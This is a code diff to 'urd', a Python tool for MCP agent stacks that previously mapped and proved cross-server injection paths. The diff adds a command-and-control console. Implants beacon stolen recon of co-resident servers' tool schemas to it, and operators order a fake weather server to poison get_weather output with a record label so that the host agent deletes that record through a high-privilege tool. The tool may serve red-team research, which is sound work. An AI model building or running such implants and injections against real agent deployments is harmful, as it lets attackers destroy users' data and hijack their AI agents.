@@ -4,8 +4,12 @@ Urd finds and proves cross-server authority injection in MCP agent stacks:
 where a low-privilege server's output can reach — or has already reached — a
 high-privilege tool's argument.
 
-  urd find-seams --manifests DIR [--trace FILE]   recon: where can you inject?
-  urd analyze    --manifests DIR --trace FILE      proof: did the injection land?
+  urd listen     [--port 8731]                     C2: run the operator console
+  urd beacons                                      C2: what phoned home + the seam
+  urd inject     --city C --target T               C2: order the implant to inject
+  urd disarm     [--city C]                         C2: stand the implant down
+  urd find-seams (--manifests DIR | --recon FILE)  recon: where can you inject?
+  urd analyze    --manifests DIR --trace FILE       proof: did the injection land?
 """
 from __future__ import annotations
 
@@ -14,11 +18,12 @@ import json
 import sys
 from pathlib import Path
 
+from urd import c2, recon as recon_mod
 from urd.divergence import build_report, to_dot
 from urd.manifests import build_declared_graph, load_manifests_dir
 from urd.runtime import build_observed_graph
 from urd.seams import find_static_seams, confirm_from_trace, build_seam_report
-from urd.pretty import dim, warn, bad, info, style
+from urd.pretty import dim, head, ok, warn, bad, info, style
 
 _E = sys.stderr  # human summaries go to stderr; color-gated on the stderr TTY
 
@@ -43,15 +48,36 @@ def _load_graphs(manifests_dir: Path, trace_path: Path):
     return declared, observed
 
 
+def _load_recon(recon_path: Path) -> dict:
+    return json.loads(recon_path.read_text(encoding="utf-8"))
+
+
 def cmd_find_seams(args: argparse.Namespace) -> int:
-    manifests_dir = Path(args.manifests)
-    if not manifests_dir.is_dir():
-        print(bad(f"error: manifests directory not found: {manifests_dir}", stream=_E), file=_E)
-        return 2
-    try:
-        servers, host = load_manifests_dir(manifests_dir)
-    except Exception as exc:  # noqa: BLE001 - surface manifest errors to the operator
-        print(bad(f"error: {exc}", stream=_E), file=_E)
+    # source of truth: a manifest dir (omniscient) OR a beacon of stolen recon
+    if args.recon:
+        recon_path = Path(args.recon)
+        if not recon_path.is_file():
+            print(bad(f"error: recon file not found: {recon_path}", stream=_E), file=_E)
+            return 2
+        try:
+            servers, host = recon_mod.recon_to_manifests(_load_recon(recon_path))
+        except (ValueError, KeyError) as exc:
+            print(bad(f"error: malformed recon: {exc}", stream=_E), file=_E)
+            return 2
+        if not servers:
+            print(warn("no servers in recon — implant hasn't beaconed schemas yet", stream=_E), file=_E)
+    elif args.manifests:
+        manifests_dir = Path(args.manifests)
+        if not manifests_dir.is_dir():
+            print(bad(f"error: manifests directory not found: {manifests_dir}", stream=_E), file=_E)
+            return 2
+        try:
+            servers, host = load_manifests_dir(manifests_dir)
+        except Exception as exc:  # noqa: BLE001 - surface manifest errors to the operator
+            print(bad(f"error: {exc}", stream=_E), file=_E)
+            return 2
+    else:
+        print(bad("error: pass --manifests DIR or --recon FILE", stream=_E), file=_E)
         return 2
 
     seams = find_static_seams(servers, host)
@@ -142,6 +168,107 @@ def cmd_analyze(args: argparse.Namespace) -> int:
     return 0 if not report.findings else 1
 
 
+def _c2_url(args: argparse.Namespace) -> str:
+    return getattr(args, "url", None) or c2.default_url(port=getattr(args, "port", c2.DEFAULT_PORT))
+
+
+def _print_recon_seam(recon: dict) -> None:
+    """Show the operator what the beacon reveals: the exfil, then the seam it enables."""
+    rows = recon_mod.coresident_summary(recon)
+    names = recon_mod.display_names(recon)
+    implant = recon.get("implant", "implant")
+    print(dim(f"  recon from {implant} (host {recon.get('host', '?')}):", stream=_E), file=_E)
+    for r in rows:
+        op = bad(r["operation"], stream=_E) if r["operation"] == "destructive" else dim(r["operation"], stream=_E)
+        print(f"    {style(str(r['server']), 'bold', stream=_E)}({r['privilege']}) "
+              f"{r['tool']} [{op}]", file=_E)
+    servers, host = recon_mod.recon_to_manifests(recon)
+    seams = find_static_seams(servers, host)
+    report = build_seam_report(seams)
+    for s in report["seams"]:
+        src = names.get(s["source_server"], s["source_server"])
+        dst = names.get(s["sink_server"], s["sink_server"])
+        print("    " + _sev(s["rank"].upper())
+              + f" {style(src, 'bold', stream=_E)} -> "
+              + f"{style(dst + ':' + s['sink_tool'], 'bold', stream=_E)}({s['sink_param_path']}) "
+              + dim(f"[{s['privilege_crossing']}]", stream=_E), file=_E)
+
+
+def cmd_listen(args: argparse.Namespace) -> int:
+    def on_event(kind: str, body: dict) -> None:
+        if kind == "beacon":
+            print(head(f"\n[beacon] {body.get('implant', '?')} installed on {body.get('host', '?')}",
+                       stream=_E), file=_E)
+            _print_recon_seam(body)
+            print(dim("  waiting for orders — issue: urd inject --city CITY --target LABEL", stream=_E),
+                  file=_E)
+        elif kind == "command":
+            act = body.get("action")
+            where = f"{body.get('city', '')}={body.get('target', '')}".strip("=")
+            print(ok(f"[order] {act} {body.get('implant', '')} {where}", stream=_E), file=_E)
+
+    server, _ = c2.make_server(port=args.port, on_event=on_event)
+    bound = server.server_address
+    print(head(f"urd C2 console listening on http://{bound[0]}:{bound[1]}", stream=_E), file=_E)
+    print(dim("  implants beacon here on install; drive them with `urd inject` / `urd disarm`.",
+              stream=_E), file=_E)
+    print(dim("  Ctrl-C to stop.", stream=_E), file=_E)
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print(dim("\n  console stopped.", stream=_E), file=_E)
+    finally:
+        server.server_close()
+    return 0
+
+
+def cmd_beacons(args: argparse.Namespace) -> int:
+    try:
+        snap = c2.get_beacons(_c2_url(args))
+    except Exception as exc:  # noqa: BLE001 - the console may not be running
+        print(bad(f"error: can't reach the C2 console ({exc}); is `urd listen` running?", stream=_E),
+              file=_E)
+        return 2
+    beacons = snap.get("beacons", [])
+    injections = snap.get("injections", [])
+    print(json.dumps(snap, indent=2))
+    if not beacons:
+        print(dim("no implants have beaconed yet.", stream=_E), file=_E)
+        return 0
+    for b in beacons:
+        print(head(f"\n{b.get('implant', '?')} @ {b.get('host', '?')}", stream=_E), file=_E)
+        _print_recon_seam(b)
+    if injections:
+        print(ok(f"\nstanding inject orders: {injections}", stream=_E), file=_E)
+    return 0
+
+
+def cmd_inject(args: argparse.Namespace) -> int:
+    try:
+        resp = c2.send_command(_c2_url(args), "inject", args.implant, city=args.city, target=args.target)
+    except Exception as exc:  # noqa: BLE001
+        print(bad(f"error: can't reach the C2 console ({exc}); is `urd listen` running?", stream=_E),
+              file=_E)
+        return 2
+    print(ok(f"armed: {args.implant} will inject {args.target!r} into get_weather({args.city!r})",
+             stream=_E), file=_E)
+    print(dim(f"  standing orders now: {resp.get('injections')}", stream=_E), file=_E)
+    return 0
+
+
+def cmd_disarm(args: argparse.Namespace) -> int:
+    try:
+        resp = c2.send_command(_c2_url(args), "disarm", args.implant, city=args.city or "")
+    except Exception as exc:  # noqa: BLE001
+        print(bad(f"error: can't reach the C2 console ({exc}); is `urd listen` running?", stream=_E),
+              file=_E)
+        return 2
+    where = f"get_weather({args.city!r})" if args.city else "all cities"
+    print(ok(f"stood down: {args.implant} no longer injects {where}", stream=_E), file=_E)
+    print(dim(f"  standing orders now: {resp.get('injections')}", stream=_E), file=_E)
+    return 0
+
+
 def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
         prog="urd",
@@ -149,11 +276,34 @@ def build_parser() -> argparse.ArgumentParser:
     )
     sub = parser.add_subparsers(dest="command", required=True)
 
+    p_listen = sub.add_parser("listen", help="C2: run the operator console implants beacon to")
+    p_listen.add_argument("--port", type=int, default=c2.DEFAULT_PORT, help="Port to bind (default 8731)")
+    p_listen.set_defaults(func=cmd_listen)
+
+    p_beacons = sub.add_parser("beacons", help="C2: show what has phoned home and the seam it reveals")
+    p_beacons.add_argument("--url", default=None, help="C2 console URL (default http://127.0.0.1:8731)")
+    p_beacons.set_defaults(func=cmd_beacons)
+
+    p_inject = sub.add_parser("inject", help="C2: order an implant to inject a target into a city's weather")
+    p_inject.add_argument("--city", required=True, help="City whose get_weather response to poison")
+    p_inject.add_argument("--target", required=True, help="Record label to plant for the host to delete")
+    p_inject.add_argument("--implant", default="weather-fake", help="Implant id (default weather-fake)")
+    p_inject.add_argument("--url", default=None, help="C2 console URL (default http://127.0.0.1:8731)")
+    p_inject.set_defaults(func=cmd_inject)
+
+    p_disarm = sub.add_parser("disarm", help="C2: stand an implant down (one city, or all)")
+    p_disarm.add_argument("--city", default=None, help="City to stand down (omit for all)")
+    p_disarm.add_argument("--implant", default="weather-fake", help="Implant id (default weather-fake)")
+    p_disarm.add_argument("--url", default=None, help="C2 console URL (default http://127.0.0.1:8731)")
+    p_disarm.set_defaults(func=cmd_disarm)
+
     p_seams = sub.add_parser(
         "find-seams",
         help="Recon: enumerate low-trust -> high-trust injection seams in a target",
     )
-    p_seams.add_argument("--manifests", required=True, help="Directory of *.json manifests")
+    p_seams.add_argument("--manifests", default=None, help="Directory of *.json manifests")
+    p_seams.add_argument("--recon", default=None,
+                         help="Beacon JSON of stolen recon (alternative to --manifests)")
     p_seams.add_argument("--trace", default=None,
                          help="Optional captured session to confirm which seams fired")
     p_seams.add_argument("--output", default=None, help="Write JSON seam report to this path")
